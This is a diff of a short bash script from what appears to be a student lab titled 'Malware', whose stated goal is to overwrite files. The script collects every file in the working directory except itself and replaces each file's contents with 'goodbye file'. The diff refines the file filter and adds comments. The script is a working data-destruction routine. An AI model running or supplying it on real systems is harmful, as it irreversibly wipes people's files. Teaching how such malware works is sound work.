@@ -3,19 +3,14 @@
 # Lab 7: Malware
 # Goal: overwrite files
 
-#test output
-#ls | grep -E ".*\..*[^sh]$"
+# Grab every file except malware script
+#ls | grep -Ev "script.sh"
 
-filearray=($(ls | grep -E ".*\..*[^sh]$"))
+# Load files into an array
+filearray=($(ls | grep -Ev "script.sh"))
+
+# Loop through file array and overwrite files
 for key in ${!filearray[@]}
 do
 	echo "goodbye file" > ${filearray[$key]}
 done
-
-
-# works fine for txt files
-#for filename in *.txt
-#do
-#	echo "goodbye file" > $filename
-#done
-
